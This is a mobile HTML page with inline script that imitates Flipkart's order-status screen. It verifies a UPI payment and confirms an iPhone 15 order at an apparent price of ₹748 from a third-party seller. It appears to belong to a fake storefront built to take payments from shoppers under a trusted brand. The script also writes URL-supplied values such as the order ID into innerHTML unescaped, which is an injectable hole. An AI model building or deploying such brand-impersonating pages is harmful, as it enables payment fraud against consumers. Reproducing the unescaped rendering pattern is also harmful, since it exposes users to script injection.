<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Order Status – Flipkart</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --fk-blue: #2874f0;
      --fk-green: #008c00;
      --fk-bg: #f1f3f6;
      --fk-text: #212121;
      --fk-muted: #878787;
      --fk-border: #e0e0e0;
      --ease-out: cubic-bezier(0.22, 1, 0.36, 1);
      --ease-spring: cubic-bezier(0.34, 1.56, 0.64, 1);
    }
    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background: var(--fk-bg); min-height: 100vh; color: var(--fk-text);
      animation: pageIn 0.45s var(--ease-out) both;
    }
    @keyframes pageIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .app { max-width: 480px; margin: 0 auto; min-height: 100vh; background: #fff; }
    .header {
      display: flex; align-items: center; gap: 10px;
      padding: 12px 14px; border-bottom: 1px solid var(--fk-border);
      background: #fff; position: sticky; top: 0; z-index: 10;
    }
    .fk-logo { width: 28px; height: 28px; object-fit: contain; }
    .header-title { font-size: 15px; font-weight: 700; }

    .page { padding: 16px; }
    .status-card {
      background: #fff; border: 1px solid var(--fk-border);
      border-radius: 8px; padding: 24px 18px; text-align: center;
      animation: cardIn 0.55s var(--ease-out) both;
    }
    @keyframes cardIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .status-icon {
      width: 56px; height: 56px; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
      margin: 0 auto 14px;
      animation: iconPop 0.55s var(--ease-spring) 0.15s both;
    }
    @keyframes iconPop {
      from { opacity: 0; transform: scale(0.4); }
      to { opacity: 1; transform: scale(1); }
    }
    .status-icon svg { width: 28px; height: 28px; }
    .status-icon.success { background: #e8f5e9; color: var(--fk-green); }
    .status-icon.pending { background: #fff3e0; color: #f57c00; }
    .status-icon.failed { background: #ffebee; color: #e53935; }
    .status-title { font-size: 18px; font-weight: 700; margin-bottom: 6px; }
    .status-title.success { color: var(--fk-green); }
    .status-title.pending { color: #f57c00; }
    .status-title.failed { color: #e53935; }
    .status-msg { font-size: 13px; color: var(--fk-muted); line-height: 1.5; margin-bottom: 18px; }

    .order-box {
      background: var(--fk-bg); border-radius: 8px; padding: 14px;
      text-align: left; margin-bottom: 16px; font-size: 12px;
      animation: slideUp 0.45s var(--ease-out) 0.25s both;
    }
    @keyframes slideUp {
      from { opacity: 0; transform: translateY(12px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .order-item {
      display: flex; gap: 10px; padding-bottom: 12px;
      border-bottom: 1px solid var(--fk-border); margin-bottom: 10px;
    }
    .order-item img {
      width: 48px; height: 48px; object-fit: contain;
      border: 1px solid #eee; border-radius: 4px; background: #fff;
    }
    .order-item strong { font-size: 12px; display: block; line-height: 1.3; }
    .order-item span { font-size: 10px; color: var(--fk-muted); }
    .order-row {
      display: flex; justify-content: space-between; padding: 3px 0;
      color: var(--fk-muted);
    }
    .order-row b { color: var(--fk-text); font-weight: 600; }
    .delivery-note {
      font-size: 11px; color: var(--fk-green); font-weight: 600;
      margin-top: 8px; padding-top: 8px; border-top: 1px dashed #ddd;
    }

    .spinner-wrap { padding: 40px 0; text-align: center; }
    .spinner {
      width: 32px; height: 32px; border: 3px solid #e0e0e0;
      border-top-color: var(--fk-blue); border-radius: 50%;
      margin: 0 auto 12px; animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .spinner-text { font-size: 13px; color: var(--fk-muted); }

    .btn {
      display: block; width: 100%; padding: 14px; border: none;
      border-radius: 4px; background: #ffd814; color: var(--fk-text);
      font-weight: 800; font-size: 14px; text-decoration: none;
      text-align: center; font-family: inherit; cursor: pointer;
      transition: transform 0.15s var(--ease-out), filter 0.2s ease;
      animation: slideUp 0.45s var(--ease-out) 0.35s both;
    }
    .btn:active { transform: scale(0.98); filter: brightness(0.97); }
    @media (prefers-reduced-motion: reduce) {
      *, *::before, *::after {
        animation-duration: 0.01ms !important;
        transition-duration: 0.01ms !important;
      }
    }
  </style>
</head>
<body>
  <div class="app">
    <div class="header">
      <img class="fk-logo" src="images/flipkart-logo.png" alt="Flipkart">
      <span class="header-title">Order Status</span>
    </div>
    <div class="page">
      <div id="status" class="status-card">
        <div class="spinner-wrap">
          <div class="spinner"></div>
          <div class="spinner-text">Verifying your payment…</div>
        </div>
      </div>
    </div>
  </div>
  <script>
    const params = new URLSearchParams(location.search);
    const orderId = params.get('order_id') || sessionStorage.getItem('pending_order_id');
    const product = sessionStorage.getItem('order_product') || 'APPLE iPhone 15 (Black, 128 GB)';
    const mobile = sessionStorage.getItem('order_mobile') || '—';
    const pin = sessionStorage.getItem('order_pin') || '—';

    function deliveryDate() {
      const d = new Date();
      d.setDate(d.getDate() + 2);
      return d.toLocaleDateString('en-IN', { weekday: 'short', day: 'numeric', month: 'short' });
    }

    function iconSvg(type) {
      if (type === 'success') return '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>';
      if (type === 'pending') return '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"/></svg>';
      return '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>';
    }

    let lastRendered = '';

    async function verify() {
      const el = document.getElementById('status');
      if (!orderId) {
        el.innerHTML = `
          <div class="status-icon failed">${iconSvg('failed')}</div>
          <div class="status-title failed">Order Not Found</div>
          <div class="status-msg">No order ID was provided. Please try placing your order again.</div>
          <a class="btn" href="index.html">Continue Shopping</a>`;
        return;
      }

      try {
        const r = await fetch('/api/order-status?order_id=' + encodeURIComponent(orderId));
        const text = await r.text();
        if (!text || !text.trim()) throw new Error('Empty response from server');
        const data = JSON.parse(text);

        const status = (data.payment_status || params.get('status') || '').toUpperCase();
        if (status === 'PENDING' && lastRendered === 'PENDING') {
          setTimeout(verify, 3000);
          return;
        }
        lastRendered = status;
        if (status === 'SUCCESS') sessionStorage.removeItem('pending_order_id');
        const amount = data.amount != null ? '₹' + Number(data.amount).toFixed(0) : '₹748';
        const utr = data.utr || params.get('utr') || '—';

        let type, title, msg;
        if (status === 'SUCCESS') {
          type = 'success'; title = 'Order Placed Successfully!';
          msg = 'Payment received. Your iPhone will be dispatched within 24 hours.';
        } else if (status === 'PENDING') {
          type = 'pending'; title = 'Payment Processing';
          msg = 'Your UPI payment is being verified. This usually takes 1–2 minutes.';
          setTimeout(verify, 3000);
        } else {
          type = 'failed'; title = 'Payment Failed';
          msg = 'Payment was not completed. No amount has been deducted.';
        }

        el.innerHTML = `
          <div class="status-icon ${type}">${iconSvg(type)}</div>
          <div class="status-title ${type}">${title}</div>
          <div class="status-msg">${msg}</div>
          <div class="order-box">
            <div class="order-item">
              <img src="images/img-04-lineup.png" alt="iPhone 15">
              <div>
                <strong>${product}</strong>
                <span>Sold by TrueComRetail · Qty: 1</span>
              </div>
            </div>
            <div class="order-row"><span>Order ID</span><b>${orderId}</b></div>
            <div class="order-row"><span>Amount paid</span><b>${amount}</b></div>
            <div class="order-row"><span>Mobile</span><b>+91 ${mobile}</b></div>
            <div class="order-row"><span>Payment ref</span><b>${utr}</b></div>
            <div class="delivery-note">EXPRESS delivery · Expected by ${deliveryDate()} · Pin ${pin}</div>
          </div>
          <a class="btn" href="index.html">${type === 'failed' ? 'Try Again' : 'Continue Shopping'}</a>`;
      } catch (e) {
        el.innerHTML = `
          <div class="status-icon failed">${iconSvg('failed')}</div>
          <div class="status-title failed">Verification Failed</div>
          <div class="status-msg">${e.message}</div>
          <a class="btn" href="index.html">Back to Shop</a>`;
      }
    }

    verify();
  </script>
</body>
</html>
